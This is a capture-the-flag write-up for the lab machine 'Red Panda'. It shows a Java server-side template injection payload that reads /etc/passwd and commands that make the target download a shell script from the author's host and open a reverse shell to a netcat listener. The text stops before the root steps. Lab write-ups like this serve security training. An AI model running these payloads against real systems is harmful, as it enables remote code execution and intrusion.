# Red Panda

## User Flag

After adding redpanda.htb to my vhosts, using nmap I discovered it's running ssh as well as an http proxy. After accessing port 8080, I discovered on the title, it's running Spring Boot which is a Java based system.

Knowing this I assumed the next step was to try XSS or SSTI. SSTI seemed to be the winner as after using the following payload:

```
*{7*7}
```

I was able to return the result 49, meaning I could run malicious code on the server. Using the Git Repo "PayloadAllTheThings" I found a payload corresponding to Java (what Spring Boot is a web framework of).

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

(Note that I replaced first character of the example on PayloadAllTheThings with a * like the first working payload)

From here I next wrote a python script that will be included in the repo to turn linux commands into Java based payloads.

To get the flag, I used the python tool to explore the system until I found the user flag.

```
python3 JavaPayloadGenerator.py
Linux Command to Convert: cat /home/woodenk/user.txt
```

After that I generated a reverse shell to enter the system then go for root. (Shell can be seen in the shell.sh section)

First, I hosted my shell.sh in a python webserver sitting int the /tmp/ directory with the bash script:

```
python3 -m http.server
```

Second, I used my python payload script to generate a java payload of the following:

```
python3 JavaPayloadGenerator.py
Linux Command to Convert: curl 10.10.14.6:8000/shell.sh --output /tmp/shell.sh
```

I pasted the results in the search bar to retrieve the shell.sh script I made and place it in the /tmp/ directory.

Third, I called the bash script while running a netcat listener on my device:

```
nc -lvnp 1234
python3 JavaPayloadGenerator.py
Linux Command to Convert: bash /tmp/shell.sh
```
